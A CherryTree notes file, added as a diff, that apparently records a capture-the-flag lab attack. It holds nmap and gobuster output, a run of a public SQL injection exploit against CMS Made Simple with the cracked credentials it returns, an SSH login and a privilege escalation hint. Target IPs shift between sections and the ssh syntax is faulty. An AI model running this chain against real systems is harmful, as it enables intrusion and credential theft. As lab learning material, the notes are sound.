@@ -1,0 +1,132 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <bookmarks list=""/>
+  <node name="EasyCTF" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1633697334" ts_lastsave="1633980932">
+    <node name="nmap" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1633697341" ts_lastsave="1633697569">
+      <rich_text># Nmap 7.92 scan initiated Fri Oct  8 08:50:25 2021 as: nmap -T4 -n -A -p 21,80,2222 -oN nmap.txt 10.10.202.129
+Nmap scan report for 10.10.202.129
+Host is up (0.34s latency).
+
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.8.246.32
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+| http-robots.txt: 2 disallowed entries 
+|_/ /openemr-5_0_1_3 
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
+|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
+|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.10 - 3.13 (90%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 2.6.32 (86%), Linux 2.6.32 - 3.1 (86%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   525.85 ms 10.8.0.1	
+2   533.99 ms 10.10.202.129
+
+OS and Service detection performed. Please report any incorrect results at </rich_text>
+      <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
+      <rich_text> .
+# Nmap done at Fri Oct  8 08:51:14 2021 -- 1 IP address (1 host up) scanned in 50.82 seconds</rich_text>
+    </node>
+    <node name="http port 80" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1633697748" ts_lastsave="1633974272">
+      <node name="robots.txt" unique_id="4" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1633697847" ts_lastsave="1633697895">
+        <rich_text>#
+# "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $"
+#
+#   This file tells search engines not to index your CUPS server.
+#
+#   Copyright 1993-2003 by Easy Software Products.
+#
+#   These coded instructions, statements, and computer programs are the
+#   property of Easy Software Products and are protected by Federal
+#   copyright law.  Distribution and use rights are outlined in the file
+#   "LICENSE.txt" which should have been included with this file.  If this
+#   file is missing or damaged please contact Easy Software Products
+#   at:
+#
+#       Attn: CUPS Licensing Information
+#       Easy Software Products
+#       44141 Airport View Drive, Suite 204
+#       Hollywood, Maryland 20636-3111 USA
+#
+#       Voice: (301) 373-9600
+#       EMail: cups-info@cups.org
+#         WWW: http://www.cups.org
+#
+
+User-agent: *
+Disallow: /
+
+
+Disallow: /openemr-5_0_1_3 
+#
+# End of "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $".
+#</rich_text>
+      </node>
+      <node name="simple" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1633974272" ts_lastsave="1633977512">
+        <rich_text>This web page made of “CMS Made Simple” CMS (Content Management System).
+
+This CMS is Version is 2.2.8
+
+It is vulnerable to SQLi and Its CVE is 2019-9053
+
+searchsploit CMS Made Simple</rich_text>
+        <node name="searchsploit" unique_id="7" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1633977409" ts_lastsave="1633980450">
+          <rich_text>php/webapps/46635.py
+
+Command: python3 -u </rich_text>
+          <rich_text link="webs http://10.10.38.124/simple/">http://10.10.38.124/simple/</rich_text>
+          <rich_text> -w </rich_text>
+          <rich_text link="file L2hvbWUvcGFycm90L0Rlc2t0b3AvdG9vbGJveC9TZWNMaXN0cy9QYXNzd29yZHMvQ29tbW9uLUNyZWRlbnRpYWxzL2Jlc3QxMTAudHh0">SecLists/Passwords/Common-Credentials/best110.txt</rich_text>
+          <rich_text> -c true
+
+Python2 Program Output
+
+[+] Salt for password found: 1dac0d92e9fa6bb2
+[+] Username found: mitch
+[+] Email found: admin@admin.com
+[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
+[+] Password cracked: secret</rich_text>
+        </node>
+      </node>
+    </node>
+    <node name="gobuster" unique_id="5" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1633697948" ts_lastsave="1633698601">
+      <rich_text>gobuster dir -u </rich_text>
+      <rich_text link="webs http://10.10.202.129/">http://10.10.202.129/</rich_text>
+      <rich_text> -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -t 100 -q
+/simple               (Status: 301) [Size: 315] [--&gt; </rich_text>
+      <rich_text link="webs http://10.10.202.129/simple/]">http://10.10.202.129/simple/]</rich_text>
+    </node>
+    <node name="ssh port 2222" unique_id="8" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1633980932" ts_lastsave="1633980992">
+      <rich_text>ssh mitch@10.10.38.129 -p 2222 -P secret
+
+---
+
+Privilege Escalation
+
+sudo access able and Vim is vulnerable</rich_text>
+    </node>
+  </node>
+</cherrytree>
